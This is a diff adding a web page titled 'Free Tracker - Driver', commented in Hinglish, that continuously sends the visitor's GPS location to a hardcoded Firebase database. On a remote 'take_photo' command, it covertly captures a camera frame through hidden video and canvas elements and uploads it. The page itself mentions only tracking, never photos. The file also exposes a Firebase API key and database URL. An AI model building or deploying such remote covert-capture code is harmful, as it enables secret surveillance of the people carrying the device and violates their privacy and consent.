@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Tracker - Driver</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+</head>
+<body style="background:#121212; color:white; text-align:center; font-family:sans-serif; padding:20px;">
+    <h2>Tracking Active</h2>
+    <div id="status">GPS Dhund raha hai...</div>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCWUrPm4JaKr0qDbVB_ukOSFMkSmLiYals",
+            databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com",
+            projectId: "mytrecker2-b3535",
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // 1. Live Location
+        navigator.geolocation.watchPosition((pos) => {
+            db.ref('vehicles/car_01').update({
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                last_seen: new Date().toLocaleTimeString()
+            });
+            document.getElementById('status').innerText = "🟢 Live Location Bheji ja rahi hai";
+        }, null, { enableHighAccuracy: true });
+
+        // 2. Free Camera Logic (Bina Storage ke)
+        db.ref('commands/car_01/action').on('value', (snap) => {
+            if(snap.val() === "take_photo") {
+                capturePhoto();
+            }
+        });
+
+        async function capturePhoto() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = 320; canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                const imageData = canvas.toDataURL('image/jpeg', 0.5); // Photo ko text mein badla
+                
+                db.ref('vehicles/car_01/photo').set(imageData); // Database mein save kiya
+                db.ref('commands/car_01/action').set("idle");
+                stream.getTracks().forEach(track => track.stop());
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
